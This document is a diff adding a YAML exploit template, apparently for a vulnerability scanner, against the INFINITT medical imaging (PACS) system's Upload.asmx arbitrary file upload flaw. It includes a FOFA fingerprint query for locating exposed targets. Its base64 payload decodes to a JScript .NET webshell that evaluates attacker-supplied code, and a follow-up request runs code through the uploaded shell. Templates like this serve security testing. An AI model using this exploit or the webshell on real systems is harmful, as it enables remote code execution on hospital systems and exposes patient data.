@@ -1,0 +1,48 @@
+id: poc-yaml-infinitt-upload-anyfile-upload
+info:
+  name: 英飞达医学影像存档与通信系统 Upload.asmx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 英飞达医学影像存档与通信系统
+  fofa: icon_hash="1474455751" || icon_hash="702238928"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /webservices/Upload.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/UploadData
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <UploadData xmlns="http://tempuri.org/">
+
+    <guid>1</guid>
+
+    <patientId>1</patientId>
+
+    <patientName>1</patientName>
+
+    <fileName>{{.t1}}.asmx</fileName>
+
+    <fileSize>1000</fileSize>
+
+    <file>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>
+
+    </UploadData>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"UploadResponse")
+- method: GET
+  path: /spool/1/{{.t1}}.asmx/Cmdshell?Pass=Response.Write("{{.t2}}")
+  expression: status_code == 200 && body == t2
+transport: http
